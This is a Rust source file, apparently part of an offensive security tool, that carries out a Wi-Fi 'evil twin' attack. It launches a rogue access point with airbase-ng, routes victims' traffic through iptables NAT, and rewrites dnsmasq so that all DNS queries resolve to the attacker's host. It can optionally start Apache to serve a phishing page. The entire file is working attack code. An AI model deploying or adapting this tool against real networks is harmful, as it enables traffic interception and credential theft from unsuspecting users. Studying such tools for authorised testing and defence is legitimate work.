use tokio::process::Command;
use colored::Colorize;
use tokio::time::{sleep, Duration};
use crate::data::logger;
use std::fs;

pub async fn run_evil_twin(
    interface: &str,
    ssid: &str,
    channel: u8,
    target_ip_range: &str,
    phishing_template: &str,
) -> Result<(), Box<dyn std::error::Error>> {
    println!("{}", format!("• Setting up Evil Twin AP '{}' on channel {} using '{}'...", ssid, channel, interface).blue());

    println!("{}", "  1. Bringing down network interface (ifconfig down)...".dimmed());
    let _ = Command::new("sudo").arg("ifconfig").arg(interface).arg("down").output().await?;
    sleep(Duration::from_millis(500)).await;

    println!("{}", "  2. Assigning IP address to interface (ifconfig up)...".dimmed());
    let ap_ip = "10.0.0.1";
    let _ = Command::new("sudo").arg("ifconfig").arg(interface).arg(ap_ip).arg("netmask").arg("255.255.255.0").output().await?;
    let _ = Command::new("sudo").arg("ifconfig").arg(interface).arg("up").output().await?;
    sleep(Duration::from_millis(500)).await;

    println!("{}", "  3. Enabling IP forwarding...".dimmed());
    let _ = Command::new("sudo").arg("sysctl").arg("-w").arg("net.ipv4.ip_forward=1").output().await?;

    println!("{}", "  4. Setting up NAT (iptables)...".dimmed());
    let _ = Command::new("sudo").arg("iptables").arg("-t").arg("nat").arg("-A").arg("POSTROUTING").arg("-o").arg("eth0").arg("-j").arg("MASQUERADE").output().await?;
    let _ = Command::new("sudo").arg("iptables").arg("-A").arg("FORWARD").arg("-i").arg(interface).arg("-o").arg("eth0").arg("-j").arg("ACCEPT").output().await?;
    let _ = Command::new("sudo").arg("iptables").arg("-A").arg("FORWARD").arg("-i").arg("eth0").arg("-o").arg(interface).arg("-m").arg("state").arg("--state").arg("RELATED,ESTABLISHED").arg("-j").arg("ACCEPT").output().await?;

    println!("{}", "  5. Configuring dnsmasq for DHCP and DNS...".dimmed());
    let dnsmasq_conf_path = "/etc/dnsmasq.conf.evil_twin_bak";
    fs::copy("/etc/dnsmasq.conf", dnsmasq_conf_path)?;
    let dnsmasq_content = format!(r#"
interface={}
dhcp-range=10.0.0.10,10.0.0.250,12h
dhcp-option=3,10.0.0.1
dhcp-option=6,10.0.0.1
log-queries
log-dhcp
address=/#/10.0.0.1
"#, interface);
    fs::write("/etc/dnsmasq.conf", dnsmasq_content)?;

    let _ = Command::new("sudo").arg("systemctl").arg("stop").arg("NetworkManager").output().await?;
    let _ = Command::new("sudo").arg("systemctl").arg("stop").arg("dnsmasq").output().await?;
    let _ = Command::new("sudo").arg("systemctl").arg("start").arg("dnsmasq").output().await?;
    sleep(Duration::from_millis(1000)).await;

    if !phishing_template.is_empty() {
        println!("{}", "  6. Starting Apache2 for phishing page...".dimmed());
        let _ = Command::new("sudo").arg("systemctl").arg("start").arg("apache2").output().await?;
        println!("{}", format!("    Serving phishing template from: {}", phishing_template).dimmed());
        // For a simple demo, you'd manually copy phishing_template to /var/www/html/
        // A more robust solution would copy it here.
    }

    println!("{}", "  7. Starting Airbase-ng...".dimmed());
    let mut airbase_command = Command::new("sudo");
    airbase_command
        .arg("airbase-ng")
        .arg("-c").arg(channel.to_string())
        .arg("-e").arg(ssid)
        .arg(interface);

    println!("{}", format!("  Executing: sudo airbase-ng -c {} -e {} {}", channel, ssid, interface).dimmed());
    let child = airbase_command.spawn()?;

    println!("{}", "\nEvil Twin AP is active. Monitoring for connections... (Press Ctrl+C to stop)".yellow().bold());
    logger::log_attack_event("wifi_evil_twin", "active", &format!("Evil Twin AP '{}' deployed on channel {}. Target IP Range: {}", ssid, channel, target_ip_range)).await;

    let _ = child.wait_with_output().await;

    println!("{}", "\n• Stopping Evil Twin attack...".blue());

    println!("{}", "  Cleaning up network configurations...".dimmed());
    let _ = Command::new("sudo").arg("killall").arg("-SIGTERM").arg("airbase-ng").output().await;
    let _ = Command::new("sudo").arg("iptables").arg("-t").arg("nat").arg("-D").arg("POSTROUTING").arg("-o").arg("eth0").arg("-j").arg("MASQUERADE").output().await?;
    let _ = Command::new("sudo").arg("iptables").arg("-D").arg("FORWARD").arg("-i").arg(interface).arg("-o").arg("eth0").arg("-j").arg("ACCEPT").output().await?;
    let _ = Command::new("sudo").arg("iptables").arg("-D").arg("FORWARD").arg("-i").arg("eth0").arg("-o").arg(interface).arg("-m").arg("state").arg("--state").arg("RELATED,ESTABLISHED").arg("-j").arg("ACCEPT").output().await?;
    let _ = Command::new("sudo").arg("sysctl").arg("-w").arg("net.ipv4.ip_forward=0").output().await?;
    let _ = Command::new("sudo").arg("systemctl").arg("stop").arg("dnsmasq").output().await?;
    let _ = Command::new("sudo").arg("systemctl").arg("stop").arg("apache2").output().await?;
    fs::copy(dnsmasq_conf_path, "/etc/dnsmasq.conf")?;
    let _ = fs::remove_file(dnsmasq_conf_path)?;
    let _ = Command::new("sudo").arg("systemctl").arg("start").arg("NetworkManager").output().await?;
    let _ = Command::new("sudo").arg("ifconfig").arg(interface).arg("0.0.0.0").output().await?;
    let _ = Command::new("sudo").arg("ifconfig").arg(interface).arg("up").output().await?;

    println!("{}", "• Evil Twin setup cleaned up.".green());
    logger::log_attack_event("wifi_evil_twin", "stopped", &format!("Evil Twin AP '{}' stopped.", ssid)).await;

    Ok(())
}
